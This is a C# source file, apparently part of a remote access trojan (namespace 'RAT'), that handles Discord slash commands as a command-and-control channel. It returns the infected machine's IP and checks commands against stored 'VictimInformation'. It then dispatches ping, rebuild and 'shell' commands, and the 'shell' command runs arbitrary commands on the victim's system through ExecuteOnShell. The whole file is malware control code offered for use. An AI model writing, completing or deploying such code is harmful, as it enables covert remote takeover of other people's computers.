using Discord;
using Discord.WebSocket;
using Spectre.Console;

namespace RAT;

internal partial class Handlers
{
    internal static async Task SlashComamndReceived(SocketSlashCommand cmdSocket)
    {
        if (cmdSocket.Data.Name == "getip")
        {
            await Commands.GetIp(cmdSocket);
            return;
        }
        if (cmdSocket.Data.Options.ElementAt(0)?.Value.ToString() != VictimInformation.Shared.IP.ToString()!)
            return;

        AnsiConsole.MarkupLine($"[cyan]Command Executed[/]: [red bold underline]{cmdSocket.Data.Name}[/]!");

        switch (cmdSocket.Data.Name)
        {
            case "ping":
                await Commands.Ping(cmdSocket);
                break;
            case "rebuildcmd":
                await Commands.RebuildCommands(cmdSocket);
                break;
            case "shell":
                await Commands.ExecuteOnShell(cmdSocket);
                break;
        }
    }
}